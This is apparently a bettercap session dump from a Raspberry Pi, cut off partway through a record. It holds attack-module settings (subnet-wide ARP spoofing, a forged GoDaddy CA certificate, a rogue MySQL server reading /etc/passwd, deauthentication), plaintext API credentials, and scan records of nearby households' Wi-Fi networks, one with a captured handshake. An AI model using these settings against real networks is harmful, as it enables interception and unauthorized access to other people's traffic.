{
    'version': '2.32.0',
    'os': 'linux',
    'arch': 'arm64',
    'goversion': 'go1.15.15',
    'resources': {
        'cpus': 4,
        'max_cpus': 4,
        'goroutines': 33,
        'alloc': 15205288,
        'sys': 78552617,
        'gcs': 1335
    },
    'interfaces': [{
        'index': 1,
        'mtu': 65536,
        'name': 'lo',
        'mac': '0',
        'vendor': 'Officially Xerox, but 0:0:0:0:0:0 is more common',
        'flags': ['UP', 'LOOPBACK'],
        'addresses': [{
            'address': '127.0.0.1/8',
            'type': 'ip+net'
        }, {
            'address': '::1/128',
            'type': 'ip+net'
        }]
    }, {
        'index': 2,
        'mtu': 1500,
        'name': 'eth0',
        'mac': 'dc:a6:32:e8:ed:32',
        'vendor': 'Raspberry Pi Trading Ltd',
        'flags': ['UP', 'BROADCAST', 'MULTICAST'],
        'addresses': [{
            'address': '10.0.0.95/24',
            'type': 'ip+net'
        }, {
            'address': '2601:541:4300:5260:dea6:32ff:fee8:ed32/64',
            'type': 'ip+net'
        }, {
            'address': 'fe80::dea6:32ff:fee8:ed32/64',
            'type': 'ip+net'
        }]
    }, {
        'index': 3,
        'mtu': 1500,
        'name': 'wlan0',
        'mac': 'dc:a6:32:e8:ed:33',
        'vendor': 'Raspberry Pi Trading Ltd',
        'flags': ['UP', 'BROADCAST', 'MULTICAST'],
        'addresses': []
    }, {
        'index': 4,
        'mtu': 1500,
        'name': 'wlan1',
        'mac': 'e4:5d:8a:5b:0c:9d',
        'vendor': '',
        'flags': ['UP', 'BROADCAST', 'MULTICAST'],
        'addresses': []
    }, {
        'index': 5,
        'mtu': 1500,
        'name': 'wlan2',
        'mac': '34:b2:64:21:c4:06',
        'vendor': '',
        'flags': ['UP', 'BROADCAST'],
        'addresses': []
    }],
    'options': {
        'InterfaceName': 'wlan1',
        'Gateway': '',
        'Caplet': 'https-ui',
        'AutoStart': 'events.stream',
        'Debug': False,
        'Silent': False,
        'NoColors': False,
        'NoHistory': False,
        'PrintVersion': False,
        'EnvFile': '',
        'Commands': '',
        'CpuProfile': '',
        'MemProfile': '',
        'CapletsPath': '',
        'Script': '',
        'PcapBufSize': -1
    },
    'interface': {
        'ipv4': '0.0.0.0',
        'ipv6': '',
        'mac': '00:c0:ca:ad:b8:1d',
        'hostname': 'wlan1',
        'alias': '',
        'vendor': 'Alfa, Inc.',
        'first_seen': '2022-02-12T20:23:17.045189042Z',
        'last_seen': '2022-02-12T20:23:17.045189042Z',
        'meta': {
            'values': {}
        }
    },
    'gateway': {
        'ipv4': '0.0.0.0',
        'ipv6': '',
        'mac': '00:c0:ca:ad:b8:1d',
        'hostname': 'wlan1',
        'alias': '',
        'vendor': 'Alfa, Inc.',
        'first_seen': '2022-02-12T20:23:17.045189042Z',
        'last_seen': '2022-02-12T20:23:17.045189042Z',
        'meta': {
            'values': {}
        }
    },
    'env': {
        'data': {
            '$': '{by}{fb} {env.iface.name} {reset} {bold}Â» {reset}',
            'any.proxy.dst_address': '<interface address>',
            'any.proxy.dst_port': '8080',
            'any.proxy.iface': '<interface name>',
            'any.proxy.protocol': 'TCP',
            'any.proxy.src_address': '',
            'any.proxy.src_port': '80',
            'api.rest.address': '0.0.0.0',
            'api.rest.alloworigin': '*',
            'api.rest.certificate': '~/.bettercap-https.cert.pem',
            'api.rest.certificate.bits': '4096',
            'api.rest.certificate.commonname': 'bettercap',
            'api.rest.certificate.country': 'US',
            'api.rest.certificate.locality': '',
            'api.rest.certificate.organization': 'bettercap devteam',
            'api.rest.certificate.organizationalunit': 'https://bettercap.org/',
            'api.rest.key': '~/.bettercap-https.key.pem',
            'api.rest.password': 'haonsb1379',
            'api.rest.port': '8083',
            'api.rest.record.clock': '1',
            'api.rest.username': 'noah',
            'api.rest.websocket': 'false',
            'arp.spoof.fullduplex': 'false',
            'arp.spoof.internal': 'false',
            'arp.spoof.skip_restore': 'false',
            'arp.spoof.targets': '<entire subnet>',
            'arp.spoof.whitelist': '',
            'ble.device': '-1',
            'ble.show.filter': '',
            'ble.show.limit': '0',
            'ble.show.sort': 'rssi asc',
            'ble.timeout': '5',
            'ble.ttl': '30',
            'c2.channel.control': '#events',
            'c2.channel.events': '#events',
            'c2.channel.output': '#events',
            'c2.nick': 'bettercap',
            'c2.operator': 'admin',
            'c2.password': 'password',
            'c2.sasl.password': '',
            'c2.sasl.username': '',
            'c2.server': 'localhost:6697',
            'c2.server.tls': 'true',
            'c2.server.tls.verify': 'false',
            'c2.username': 'bettercap',
            'dhcp6.spoof.domains': 'microsoft.com, google.com, facebook.com, apple.com, twitter.com',
            'dns.spoof.address': '<interface address>',
            'dns.spoof.all': 'false',
            'dns.spoof.domains': '',
            'dns.spoof.hosts': '',
            'dns.spoof.ttl': '1024',
            'events.stream.http.format.hex': 'true',
            'events.stream.http.request.dump': 'false',
            'events.stream.http.response.dump': 'false',
            'events.stream.output': '',
            'events.stream.output.rotate': 'true',
            'events.stream.output.rotate.compress': 'true',
            'events.stream.output.rotate.format': '2006-01-02 15:04:05',
            'events.stream.output.rotate.how': 'size',
            'events.stream.output.rotate.when': '10',
            'events.stream.time.format': '15:04:05',
            'gateway.address': '0.0.0.0',
            'gateway.mac': '00:c0:ca:ad:b8:1d',
            'gps.baudrate': '4800',
            'gps.device': '/dev/ttyUSB0',
            'hid.force.type': 'logitech',
            'hid.hop.period': '100',
            'hid.lna': 'true',
            'hid.ping.period': '100',
            'hid.show.filter': '',
            'hid.show.limit': '0',
            'hid.show.sort': 'mac desc',
            'hid.sniff.period': '500',
            'hid.ttl': '1200',
            'http.port': '80',
            'http.proxy.address': '<interface address>',
            'http.proxy.blacklist': '',
            'http.proxy.injectjs': '',
            'http.proxy.port': '8080',
            'http.proxy.redirect': 'true',
            'http.proxy.script': '',
            'http.proxy.sslstrip': 'false',
            'http.proxy.whitelist': '',
            'http.server.address': '<interface address>',
            'http.server.path': '.',
            'http.server.port': '80',
            'https.port': '443',
            'https.proxy.address': '<interface address>',
            'https.proxy.blacklist': '',
            'https.proxy.certificate': '~/.bettercap-ca.cert.pem',
            'https.proxy.certificate.bits': '4096',
            'https.proxy.certificate.commonname': 'Go Daddy Secure Certificate Authority - G2',
            'https.proxy.certificate.country': 'US',
            'https.proxy.certificate.locality': 'Scottsdale',
            'https.proxy.certificate.organization': 'GoDaddy.com, Inc.',
            'https.proxy.certificate.organizationalunit': 'https://certs.godaddy.com/repository/',
            'https.proxy.injectjs': '',
            'https.proxy.key': '~/.bettercap-ca.key.pem',
            'https.proxy.port': '8083',
            'https.proxy.redirect': 'true',
            'https.proxy.script': '',
            'https.proxy.sslstrip': 'false',
            'https.proxy.whitelist': '',
            'https.server.address': '0.0.0.0',
            'https.server.certificate': '~/.bettercap-https.cert.pem',
            'https.server.certificate.bits': '4096',
            'https.server.certificate.commonname': 'bettercap',
            'https.server.certificate.country': 'US',
            'https.server.certificate.locality': '',
            'https.server.certificate.organization': 'bettercap devteam',
            'https.server.certificate.organizationalunit': 'https://bettercap.org/',
            'https.server.key': '~/.bettercap-https.key.pem',
            'https.server.path': '/usr/share/bettercap/ui',
            'https.server.port': '443',
            'iface.index': '4',
            'iface.ipv4': '0.0.0.0',
            'iface.ipv6': '',
            'iface.mac': '00:c0:ca:ad:b8:1d',
            'iface.name': 'wlan1',
            'log.debug': 'false',
            'log.silent': 'false',
            'mac.changer.address': '<random mac>',
            'mac.changer.iface': '<interface name>',
            'mdns.server.address': '<interface address>',
            'mdns.server.address6': '<interface address6>',
            'mdns.server.domain': 'local.',
            'mdns.server.host': 'kali-rpi.',
            'mdns.server.info': 'rpBA=DE:AD:BE:EF:CA:FE, rpAD=abf99d4ff73f, rpHI=ec5fb3caf528, rpHN=20f8fb46e2eb, rpVr=164.16, rpHA=7406bd0eff69',
            'mdns.server.port': '52377',
            'mdns.server.service': '_companion-link._tcp.',
            'mysql.server.address': '<interface address>',
            'mysql.server.infile': '/etc/passwd',
            'mysql.server.outfile': '',
            'mysql.server.port': '3306',
            'ndp.spoof.neighbour': 'fe80::1',
            'ndp.spoof.prefix': 'd00d::',
            'ndp.spoof.prefix.length': '64',
            'ndp.spoof.targets': '',
            'net.fuzz.layers': 'Payload',
            'net.fuzz.rate': '1.0',
            'net.fuzz.ratio': '0.4',
            'net.fuzz.silent': 'false',
            'net.probe.mdns': 'true',
            'net.probe.nbns': 'true',
            'net.probe.throttle': '10',
            'net.probe.upnp': 'true',
            'net.probe.wsd': 'true',
            'net.show.filter': '',
            'net.show.limit': '0',
            'net.show.meta': 'false',
            'net.show.sort': 'ip asc',
            'net.sniff.filter': 'not arp',
            'net.sniff.local': 'false',
            'net.sniff.output': '',
            'net.sniff.regexp': '',
            'net.sniff.source': '',
            'net.sniff.verbose': 'false',
            'packet.proxy.chain': 'OUTPUT',
            'packet.proxy.plugin': '',
            'packet.proxy.queue.num': '0',
            'packet.proxy.rule': '',
            'syn.scan.show-progress-every': '1',
            'tcp.address': '',
            'tcp.port': '443',
            'tcp.proxy.address': '<interface address>',
            'tcp.proxy.port': '8443',
            'tcp.proxy.script': '',
            'tcp.tunnel.address': '',
            'tcp.tunnel.port': '0',
            'ticker.commands': 'clear; net.show; events.show 20',
            'ticker.period': '1',
            'wifi.ap.bssid': '<random mac>',
            'wifi.ap.channel': '1',
            'wifi.ap.encryption': 'true',
            'wifi.ap.ssid': 'FreeWiFi',
            'wifi.ap.ttl': '300',
            'wifi.assoc.acquired': 'false',
            'wifi.assoc.open': 'false',
            'wifi.assoc.silent': 'false',
            'wifi.assoc.skip': '',
            'wifi.channel_switch_announce.silent': 'false',
            'wifi.deauth.acquired': 'false',
            'wifi.deauth.open': 'true',
            'wifi.deauth.silent': 'false',
            'wifi.deauth.skip': '',
            'wifi.fake_auth.silent': 'false',
            'wifi.handshakes.aggregate': 'true',
            'wifi.handshakes.file': '~/bettercap-wifi-handshakes.pcap',
            'wifi.hop.period': '250',
            'wifi.interface': 'wlan1',
            'wifi.region': '',
            'wifi.rssi.min': '-200',
            'wifi.show.filter': '',
            'wifi.show.limit': '0',
            'wifi.show.manufacturer': 'false',
            'wifi.show.sort': 'rssi asc',
            'wifi.skip-broken': 'true',
            'wifi.source.file': '',
            'wifi.sta.ttl': '300',
            'wifi.txpower': '30'
        }
    },
    'lan': {
        'hosts': []
    },
    'wifi': {
        'aps': [{
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:79:0a:3b:42:76',
            'hostname': 'B.Scears',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:45.040846082Z',
            'last_seen': '2022-02-12T22:32:19.215868117Z',
            'meta': {
                'values': {}
            },
            'frequency': 5240,
            'channel': 48,
            'rssi': -79,
            'sent': 75516,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': '0000',
                'Device Name': 'WLAN-ROUTER',
                'Manufacturer': 'Intel Corporation',
                'Model Name': ' ',
                'Model Number': ' ',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': ' ',
                'State': 'Configured',
                'UUID-E': 'ebf5a0a01dd111b2a90f06790a3b4274',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '28:3b:82:e1:e9:f5',
            'hostname': '283b82e1e9f3',
            'alias': '',
            'vendor': 'D-Link International',
            'first_seen': '2022-02-12T20:23:29.485140898Z',
            'last_seen': '2022-02-12T22:32:39.695668899Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -75,
            'sent': 1377343,
            'received': 88890,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {
                '0x103A': '02',
                'Config Methods': 'Push Button, Label',
                'Device Name': 'Verizon',
                'Manufacturer': 'D-Link',
                'Model Name': 'Verizon Platform',
                'Model Number': 'DSL-2750B',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz',
                'Response Type': 'AP',
                'Selected Registrar': '00',
                'Serial Number': 'PX5D1HC028484',
                'State': 'Configured',
                'UUID-E': '0e36a26d29496f1efabd2905e6370e65',
                'Version': '1.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '56:12:65:57:c9:26',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:29:05.808631148Z',
            'last_seen': '2022-02-12T22:32:39.184547213Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -76,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f6:79:0a:3b:42:75',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.903138051Z',
            'last_seen': '2022-02-12T22:32:13.072531403Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -61,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '5c:e3:0e:c9:56:b3',
            'hostname': 'macnurlen',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:34.292065863Z',
            'last_seen': '2022-02-12T22:32:07.953862211Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -86,
            'sent': 2648,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': 'Label',
                'Device Name': 'AtherosAP',
                'Manufacturer': 'Atheros Communications, Inc.',
                'Model Name': 'APxx',
                'Model Number': 'APxx-xxx',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': 'Serial Number Here',
                'State': 'Configured',
                'UUID-E': 'bb76d39bad895d069ac59abf13266d56',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'b6:70:5d:b8:e6:10',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:44.016539677Z',
            'last_seen': '2022-02-12T22:32:18.702731269Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -84,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '1e:05:01:d4:ef:08',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:46:48.211454076Z',
            'last_seen': '2022-02-12T22:31:32.115248102Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -87,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:4a:9e:39',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:13:31.919346277Z',
            'last_seen': '2022-02-12T22:32:17.881033633Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -87,
            'sent': 2376,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:5e:42:47:e6:76',
            'hostname': 'Micucci',
            'alias': '',
            'vendor': 'Technicolor CH USA Inc.',
            'first_seen': '2022-02-12T20:25:50.481156034Z',
            'last_seen': '2022-02-12T22:32:13.070782003Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -75,
            'sent': 21077,
            'received': 10396,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                '0x103A': '02',
                'Config Methods': 'Display',
                'Device Name': 'Xfinity Wireless Gateway',
                'Manufacturer': 'Technicolor',
                'Model Name': 'XB7',
                'Model Number': 'CGM4331COM',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': '1234',
                'State': 'Configured',
                'UUID-E': '908d993e8d85e52e27b0ebb4b709f311',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '10:09:f9:fc:ff:41',
                'hostname': '',
                'alias': '',
                'vendor': '',
                'first_seen': '2022-02-12T22:26:44.883396735Z',
                'last_seen': '2022-02-12T22:30:26.576575597Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2462,
                'channel': 1,
                'rssi': -86,
                'sent': 100,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'c6:3f:cb:db:0d:99',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.898988513Z',
            'last_seen': '2022-02-12T22:32:12.561802745Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -60,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'b2:70:5d:b8:e6:10',
            'hostname': 'XFINITY',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:44.016063056Z',
            'last_seen': '2022-02-12T22:32:18.191326305Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -85,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ce:3f:cb:db:0d:9a',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:01.938442548Z',
            'last_seen': '2022-02-12T22:32:36.112093646Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'a8:5e:45:af:e6:d4',
            'hostname': 'home_net',
            'alias': '',
            'vendor': 'ASUSTek COMPUTER INC.',
            'first_seen': '2022-02-12T20:24:02.960099721Z',
            'last_seen': '2022-02-12T22:32:37.134702956Z',
            'meta': {
                'values': {}
            },
            'frequency': 5805,
            'channel': 161,
            'rssi': -73,
            'sent': 38440,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'a4:15:88:f9:7d:f0',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T21:05:48.560589522Z',
            'last_seen': '2022-02-12T22:32:07.960561371Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -79,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ee:a0:97:45:c9:6a',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:44.528424393Z',
            'last_seen': '2022-02-12T22:29:22.103916123Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -86,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '72:d7:9a:c2:77:21',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:00.911493299Z',
            'last_seen': '2022-02-12T22:32:35.088021623Z',
            'meta': {
                'values': {}
            },
            'frequency': 5765,
            'channel': 153,
            'rssi': -29,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'd2:3f:cb:db:0d:9a',
            'hostname': 'XFINITY',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:01.93592635Z',
            'last_seen': '2022-02-12T22:32:36.112287587Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '44:a5:6e:01:f8:63',
            'hostname': 'NETGEAR80',
            'alias': '',
            'vendor': 'Netgear',
            'first_seen': '2022-02-12T20:23:29.485654223Z',
            'last_seen': '2022-02-12T22:32:39.695414087Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -55,
            'sent': 73084,
            'received': 11398,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'AP Setup Locked': '01',
                'Config Methods': 'Display',
                'Device Name': 'C7000v2',
                'Manufacturer': 'Netgear',
                'Model Name': 'Netgear',
                'Model Number': '123456',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': '0000001',
                'State': 'Configured',
                'UUID-E': '4f27b387cf5b40186acc6b176450fc00',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '14:91:38:d3:82:55',
                'hostname': '',
                'alias': '',
                'vendor': 'Amazon Technologies Inc.',
                'first_seen': '2022-02-12T22:24:58.895309993Z',
                'last_seen': '2022-02-12T22:32:39.185131631Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2417,
                'channel': 1,
                'rssi': -75,
                'sent': 252,
                'received': 50,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': 'f0:f0:a4:60:b7:90',
                'hostname': '',
                'alias': '',
                'vendor': 'Amazon Technologies Inc.',
                'first_seen': '2022-02-12T22:28:31.37596132Z',
                'last_seen': '2022-02-12T22:28:31.37596132Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2412,
                'channel': 1,
                'rssi': -77,
                'sent': 50,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': True
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f2:a0:97:45:c9:6a',
            'hostname': 'XFINITY',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:46:58.237963616Z',
            'last_seen': '2022-02-12T22:32:18.191584709Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -85,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ea:a0:97:45:c9:6a',
            'hostname': 'xfinitywifi',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:19:58.863543069Z',
            'last_seen': '2022-02-12T22:32:18.190993699Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -86,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '62:45:b0:29:4e:c9',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:00.398784789Z',
            'last_seen': '2022-02-12T22:32:34.574712578Z',
            'meta': {
                'values': {}
            },
            'frequency': 5745,
            'channel': 149,
            'rssi': -56,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '26:05:01:d4:ef:08',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:09:47.029513242Z',
            'last_seen': '2022-02-12T22:30:57.809241891Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -76,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '3e:7a:8a:3b:cf:d0',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:29.486029605Z',
            'last_seen': '2022-02-12T22:32:39.184447992Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -22,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:48:e6:74',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:29.686098001Z',
            'last_seen': '2022-02-12T22:32:13.071926246Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -75,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:79:0a:3b:42:75',
            'hostname': 'B.Scears',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:38.900723242Z',
            'last_seen': '2022-02-12T22:32:13.072410627Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -61,
            'sent': 137890,
            'received': 918,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                '0x103A': '02',
                'AP Setup Locked': '01',
                'Config Methods': '0000',
                'Device Name': 'WLAN-ROUTER',
                'Manufacturer': 'Intel Corporation',
                'Model Name': ' ',
                'Model Number': ' ',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': ' ',
                'State': 'Configured',
                'UUID-E': 'ebf5a0a01dd111b2a90f06790a3b4274',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'd4:3f:cb:db:0d:9a',
            'hostname': 'Calvin91',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:24:01.939733008Z',
            'last_seen': '2022-02-12T22:32:36.112217403Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -77,
            'sent': 8054,
            'received': 12066,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'AP Setup Locked': '01',
                'RF Bands': '5.0Ghz',
                'State': 'Configured',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '20:f5:43:26:81:8e',
                'hostname': '',
                'alias': '',
                'vendor': 'Hui Zhou Gaoshengda Technology Co.,LTD',
                'first_seen': '2022-02-12T22:27:53.486547563Z',
                'last_seen': '2022-02-12T22:30:50.127957033Z',
                'meta': {
                    'values': {}
                },
                'frequency': 5785,
                'channel': 157,
                'rssi': -81,
                'sent': 408,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '26:1e:76:34:f4:93',
                'hostname': '',
                'alias': '',
                'vendor': '',
                'first_seen': '2022-02-12T22:26:41.807080366Z',
                'last_seen': '2022-02-12T22:30:14.799464496Z',
